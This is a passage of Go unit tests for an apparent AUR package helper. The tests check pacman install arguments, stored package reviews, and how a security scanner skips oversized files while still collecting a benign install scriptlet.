	if !slices.Equal(pacman[0], []string{"sudo", "-S", "--asdeps", "--needed", "--noconfirm", "--", "repo-dep"}) {
		t.Fatalf("repo install argv = %v", pacman[0])
	}
	if !strings.Contains(strings.Join(pacman[1], " "), "aurdep.pkg.tar.zst") {
		t.Fatalf("dep install argv = %v", pacman[1])
	}
	if !strings.Contains(strings.Join(pacman[2], " "), "demo.pkg.tar.zst") {
		t.Fatalf("root install argv = %v", pacman[2])
	}
	for _, name := range []string{"demo", "aurdep"} {
		rec, err := store.Get(name)
		if err != nil || rec == nil {
			t.Fatalf("review for %s missing: %v", name, err)
		}
	}
}

func TestCollectLocalFilesSkipsOversizedWithFinding(t *testing.T) {
	dir := t.TempDir()
	big, err := os.Create(filepath.Join(dir, "blob.bin"))
	if err != nil {
		t.Fatal(err)
	}
	if err := big.Truncate(maxLocalFileBytes + 1); err != nil {
		t.Fatal(err)
	}
	if err := big.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "clean.install"), []byte("post_install() { :; }\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	ctx := &scanner.Context{}
	findings := collectLocalFiles(ctx, dir)
	if len(findings) != 1 {
		t.Fatalf("findings = %+v", findings)
	}
	if findings[0].Rule != "oversized-local-file" || findings[0].Severity != scanner.Warning {
		t.Fatalf("unexpected finding: %+v", findings[0])
	}
	if !strings.Contains(findings[0].Message, "blob.bin") || !strings.Contains(findings[0].Message, "not scanned") {
		t.Fatalf("unhelpful message: %q", findings[0].Message)
	}
	for _, src := range ctx.Sources {
		if src.Name == "clean.install" {
			if !src.Present || !src.IsScript || src.Raw == "" {
				t.Fatalf("clean scriptlet not collected: %+v", src)
			}
			return
		}
	}
	t.Fatal("clean.install missing from collected sources")
}

func TestReadRegularFileRejectsOversized(t *testing.T) {
	path := filepath.Join(t.TempDir(), "PKGBUILD")
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	if err := f.Truncate(maxLocalFileBytes + 1); err != nil {
		t.Fatal(err)
	}
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}
	if _, err := readRegularFile(path); err == nil {
		t.Fatal("oversized PKGBUILD was read")
	}
}
